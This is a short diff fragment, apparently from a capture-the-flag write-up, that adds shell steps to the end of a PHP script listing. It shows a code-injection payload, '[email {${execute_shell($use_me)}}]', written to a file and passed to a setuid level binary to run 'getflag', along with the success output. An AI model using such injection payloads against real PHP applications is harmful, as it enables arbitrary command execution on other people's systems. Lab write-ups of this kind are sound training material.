@@ -28,4 +28,8 @@ print $output;
 ?>
 
 
+> cat /home/leve09/file
 [email {${execute_shell($use_me)}}]
+
+> /home/flag09/flag09 /home/level09/file "getflag"
+You have successfully executed getflag on a target account.
